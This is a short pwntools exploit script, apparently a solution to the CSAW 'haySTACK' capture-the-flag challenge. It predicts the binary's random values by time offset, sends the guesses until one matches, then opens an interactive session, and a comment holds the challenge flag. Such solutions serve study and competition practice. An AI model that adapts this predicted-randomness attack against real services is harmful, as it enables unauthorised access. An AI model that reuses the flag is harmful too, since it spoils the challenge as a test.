from pwn import *
import os

BIN="./haySTACK"

def exploit():
	for OFFSET in range(-10,10,3):
		values = os.popen("./rand {}".format(OFFSET)).read()
		io = process(BIN)
		#io = remote("pwn.chal.csaw.io", 5002)
		values = values.strip().split(" ")
		print(values)
		for v in values:
			io.recvuntil("check?")
			io.sendline(v)
			io.recvuntil("Hey")
			answer = "Hey" + io.recvline().decode()
			print(answer)
			if "That's it" in answer:
				io.interactive()
	        
	            
	       

exploit()

#flag{4lw4YS_r3m3mB3R_2_ch3CK_UR_st4cks}


